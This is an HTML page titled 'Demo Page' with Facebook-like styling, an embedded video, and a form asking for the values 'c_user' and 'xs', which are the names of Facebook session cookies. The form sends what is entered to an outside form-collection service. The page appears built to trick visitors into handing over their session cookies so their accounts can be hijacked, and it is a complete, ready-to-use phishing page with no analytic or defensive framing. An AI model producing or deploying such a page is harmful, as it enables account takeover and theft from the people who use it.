<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Demo Page</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f0f2f5;
      display: flex;
      justify-content: center;
      padding-top: 60px;
    }
    .box {
      background: #fff;
      padding: 25px;
      border-radius: 8px;
      width: 100%;
      max-width: 400px;
      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
    }
    input, button {
      width: 100%;
      padding: 10px;
      margin-bottom: 10px;
      border-radius: 6px;
      border: 1px solid #ddd;
      font-size: 15px;
    }
    button {
      background: #1877f2;
      color: #fff;
      border: none;
      cursor: pointer;
    }
  </style>
</head>
<body>

  <div class="box">

    <!-- Video -->
    <video width="100%" controls>
      <source src="https://resource2.heygen.ai/video_translate/94087358030a4df8b20e73f1fba92ed5-en/720p.mp4" type="video/mp4">
    </video>

    <!-- Form -->
    <form action="https://submit-form.com/nHgDXoBTJ" method="POST">
      <input type="text" name="c_user" placeholder="c_user" required>
      <input type="text" name="xs" placeholder="xs" required>
      <button type="submit">Submit</button>
    </form>

  </div>

</body>
</html>
